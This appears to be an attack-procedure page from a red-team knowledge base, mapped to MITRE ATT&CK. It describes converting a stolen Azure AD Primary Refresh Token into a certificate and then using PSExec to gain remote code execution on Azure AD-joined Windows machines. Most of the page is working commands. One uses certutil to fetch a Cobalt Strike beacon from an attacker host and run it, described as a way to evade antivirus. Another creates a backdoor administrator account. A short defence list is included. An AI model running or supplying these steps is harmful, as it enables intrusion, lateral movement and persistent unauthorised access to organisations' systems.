---
id: 6fe8b50a-7ea3-4aea-b0ad-19c6bb8f681d
name: azure-pass-the-certificate-ad-cert-request-and-rce
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.756058+00:00'
updated_at: '2023-05-25T18:50:44.684982+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Cloud Service Discovery|T1526 - Cloud Service Discovery]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
  - >-
    [[techniques/Use Alternate Authentication Material|T1550 - Use Alternate
    Authentication Material]]
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques: []
platforms:
  - Cloud
  - Windows
tags:
  - '[[tags/Certutil]]'
  - '[[tags/Cloud - Azure]]'
  - '[[tags/Pass The Certificate]]'
  - '[[tags/PSExec]]'
commands:
  - '[[commands/convert-prt-to-azure-certificate]]'
  - '[[commands/download-and-execute-cobalt-strike-beacon-via-azure-cert-psexec]]'
  - '[[commands/add-remote-admin-user-via-azure-cert-psexec]]'
tools:
  - '[[tools/prt-to-cert]]'
  - '[[tools/azure-ad-joined-machine-ptc]]'
validated: true
---

# azure-pass-the-certificate-ad-cert-request-and-rce

## Summary

This procedure demonstrates how to convert a Primary Refresh Token (PRT) into an Azure AD certificate for authentication, then leverage that certificate to perform remote command execution (RCE) on a target Azure AD-joined Windows machine using PSExec. It enables lateral movement, persistence, and privilege escalation in hybrid Azure AD environments by abusing certificate-based authentication.

## Description

In Azure AD environments, attackers with a stolen PRT can request a short-lived certificate (valid for 14 days) to authenticate as the compromised user. This certificate is then used with tools like AdureADJoinedMachinePTC to execute commands remotely on domain-joined machines via PSExec over SMB, bypassing traditional credential requirements. The technique targets Windows systems joined to Azure AD, allowing RCE for tasks like downloading payloads (e.g., Cobalt Strike beacons) or creating backdoor accounts. It maps to MITRE ATT&CK tactics including Initial Access, Lateral Movement, and Persistence, and is effective in environments with weak certificate monitoring. Prerequisites include a valid PRT, tenant details, and network access to the target.

## Requirements

1. Valid PRT, Tenant ID, hexadecimal Context, and Derived Key from a compromised Azure AD session (obtainable via Pass the PRT techniques).
2. Target Azure AD-joined Windows machine with network accessibility (SMB ports open).
3. Python environment with required libraries (impacket, minikerberos, cryptography, pyasn1).
4. Tools: [[tools/prt-to-cert]] for certificate generation and [[tools/azure-ad-joined-machine-ptc]] for RCE.

## Defense

- Enable multi-factor authentication (MFA) and conditional access policies for Azure AD to limit PRT theft.
- Monitor and audit certificate issuance/revocation events in Azure AD logs for anomalous requests.
- Implement network segmentation to restrict SMB traffic between Azure AD-joined devices.
- Use endpoint detection and response (EDR) tools to monitor PSExec usage and unexpected certificate authentications.
- Regularly rotate certificates and enforce short validity periods.

## Objectives

1. Generate an Azure AD certificate from a stolen PRT for alternate authentication.
2. Authenticate to a remote Azure AD-joined machine using the certificate.
3. Execute remote commands to download and run payloads or create persistent access.
4. Achieve lateral movement and privilege escalation in the target environment.
5. Maintain access for further post-exploitation activities.

## Instructions

### Step 1: Convert PRT to Azure AD Certificate

**Context**: Use the PRT and associated session data to request a certificate that can authenticate as the compromised user. This step generates a PFX file valid for 14 days, which serves as the alternate authentication material.

**Command** ([[commands/convert-prt-to-azure-certificate]]):
```bash
python RequestCert.py --tenantId $_TENANT_ID --prt $_PRT --userName $_USERNAME@$_TENANT_NAME.onmicrosoft.com --hexCtx $_HEX_CONTEXT --hexDerivedKey $_HEX_DERIVED_KEY
```

> This command invokes the PrtToCert tool to create the certificate. Replace placeholders with actual values from the PRT extraction. The output saves a PFX file named after the username (e.g., user@tenant.onmicrosoft.com.pfx) with password "AzureADCert". Verify the file exists and is not corrupted before proceeding.

### Step 2: Download and Execute Cobalt Strike Beacon via PSExec

**Context**: Authenticate to the target machine using the new certificate and execute a command to download a beacon payload from an attacker-controlled server, then run it for initial RCE and C2 establishment.

**Command** ([[commands/download-and-execute-cobalt-strike-beacon-via-azure-cert-psexec]]):
```bash
python Main.py --usercert $_USERNAME@$_TENANT_NAME.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $_TARGET_IP --command "certutil.exe -urlcache -split -f http://$_ATTACKER_IP:$_ATTACKER_PORT/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
```

> This uses the AdureADJoinedMachinePTC tool to perform certificate-based authentication and PSExec RCE. The command downloads the beacon via certutil (to evade basic AV) and executes it. Monitor for successful download and execution; a new process (beacon.exe) should spawn on the target.

### Step 3: Add Persistent Admin User via PSExec (Optional)

**Context**: If persistence is needed, use the certificate to create a local admin account on the target for ongoing access, enabling future logins without the certificate.

**Command** ([[commands/add-remote-admin-user-via-azure-cert-psexec]]):
```bash
python Main.py --usercert $_USERNAME@$_TENANT_NAME.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $_TARGET_IP --command "cmd.exe /c net user $_BACKDOOR_USERNAME $_BACKDOOR_PASSWORD /add /Y && net localgroup administrators $_BACKDOOR_USERNAME /add"
```

> Similar to Step 2, this executes net user commands via PSExec to add and privilege a backdoor account. Customize username and password. Success is confirmed by querying the target (e.g., via WMI) to verify the new admin user exists.
